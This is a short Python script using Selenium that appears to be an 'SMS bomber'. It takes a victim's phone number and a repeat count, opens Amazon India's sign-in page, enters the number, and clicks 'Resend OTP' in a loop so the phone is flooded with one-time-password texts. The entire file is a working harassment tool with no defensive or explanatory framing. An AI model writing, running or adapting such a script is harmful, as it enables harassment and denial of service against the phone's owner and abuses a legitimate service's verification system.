from selenium import webdriver

number=input("give the phone number:")
times = int(input('give the number of times to bomb:'))
browser = webdriver.Firefox(executable_path='./geckodriver')
browser.get('https://www.amazon.in/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=inflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_custrec_signin&switch_account=')
phoneno=browser.find_element_by_id('ap_email')
cont=browser.find_element_by_id('continue')
phoneno.send_keys(number)
cont.click()

otp=browser.find_element_by_id('continue')
otp.click()
for i in range(times-1):
    otplink = browser.find_element_by_link_text('Resend OTP')
    otplink.click()
    